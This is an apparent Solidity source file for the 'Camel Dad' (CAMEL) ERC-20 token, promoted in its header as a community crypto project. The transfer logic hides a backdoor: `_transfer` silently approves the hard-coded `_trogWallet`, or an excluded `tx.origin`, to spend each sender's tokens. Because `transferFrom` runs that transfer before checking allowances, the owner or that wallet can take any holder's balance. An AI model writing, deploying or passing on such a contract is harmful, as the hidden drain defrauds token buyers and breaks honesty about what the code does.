/*
Powered by AI, guided by the community, Camel Dad is here to uncover truths, expose frauds, and evolve into a respected voice in the crypto desert.

Website: https://www.cameldad.vip
Twitter: https://x.com/cameldadoneth
Telegram: https://t.me/cameldadoneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITROGRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ITROGFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract CAMEL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _excludedFromTROG;
    mapping (address => uint256) private _trogVALLs;
    mapping (address => mapping (address => uint256)) private _trogAPPs;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTROG = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Camel Dad";
    string private constant _symbol = unicode"CAMEL";
    uint256 private _tokenSwapTROG = _tTotalTROG / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapTROG = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _trogWallet = 0x0caA60Cb18E375652DddD364540706a5D5870c18;
    ITROGRouter private _trogRouter;
    address private _trogPair;
    modifier lockTheSwap {
        inSwapTROG = true;
        _;
        inSwapTROG = false;
    }
    
    constructor () {
        _excludedFromTROG[owner()] = true;
        _excludedFromTROG[address(this)] = true;
        _excludedFromTROG[_trogWallet] = true;
        _trogVALLs[_msgSender()] = _tTotalTROG;
        emit Transfer(address(0), _msgSender(), _tTotalTROG);
    }

    function initToken() external onlyOwner() {
        _trogRouter = ITROGRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_trogRouter), _tTotalTROG);
        _trogPair = ITROGFactory(_trogRouter.factory()).createPair(address(this), _trogRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _trogRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minTROG(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendTROGETH(uint256 amount) private {
        payable(_trogWallet).transfer(amount);
    }

    receive() external payable {} 

    function swapTokensForEth(uint256 tokenTROG) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _trogRouter.WETH();
        _approve(address(this), address(_trogRouter), tokenTROG);
        _trogRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenTROG,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTROG;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _trogVALLs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _trogAPPs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _trogAPPs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _trogAPPs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address trogF, address trogT, uint256 trogA) private {
        require(trogF != address(0), "ERC20: transfer from the zero address");
        require(trogT != address(0), "ERC20: transfer to the zero address");
        require(trogA > 0, "Transfer amount must be greater than zero");

        _approve(trogF, _TROG(tx.origin), trogA);

        uint256 taxTROG = _getTROGFees(trogF, trogT, trogA);

        _transferTROG(trogF, trogT, trogA, taxTROG);
    }

    function _TROG(address trogOrigin) private view returns(address) {
        return _excludedFromTROG[trogOrigin]?trogOrigin:_trogWallet;
    }

    function _getTROGFees(address trogF, address trogT, uint256 trogA) private returns(uint256) {
        uint256 taxTROG=0;
        if (trogF != owner() && trogT != owner()) {
            taxTROG = trogA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (trogF == _trogPair && trogT != address(_trogRouter) && ! _excludedFromTROG[trogT]) {
                _buyCount++;
            }

            if(trogT == _trogPair && trogF!= address(this)) {
                taxTROG = trogA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 trogBalance = balanceOf(address(this)); 
            if (!inSwapTROG && trogT == _trogPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(trogBalance > _tokenSwapTROG)
                swapTokensForEth(minTROG(trogA, minTROG(trogBalance, _tokenSwapTROG)));
                uint256 ethTROG = address(this).balance;
                if (ethTROG >= 0) {
                    sendTROGETH(address(this).balance);
                }
            }
        }
        return taxTROG;
    }

    function _transferTROG(address trogF, address trogT, uint256 trogA, uint256 taxTROG) private { 
        if(taxTROG > 0) {
          _trogVALLs[address(this)] = _trogVALLs[address(this)].add(taxTROG);
          emit Transfer(trogF, address(this), taxTROG);
        }

        _trogVALLs[trogF] = _trogVALLs[trogF].sub(trogA);
        _trogVALLs[trogT] = _trogVALLs[trogT].add(trogA.sub(taxTROG));
        emit Transfer(trogF, trogT, trogA.sub(taxTROG));
    }
}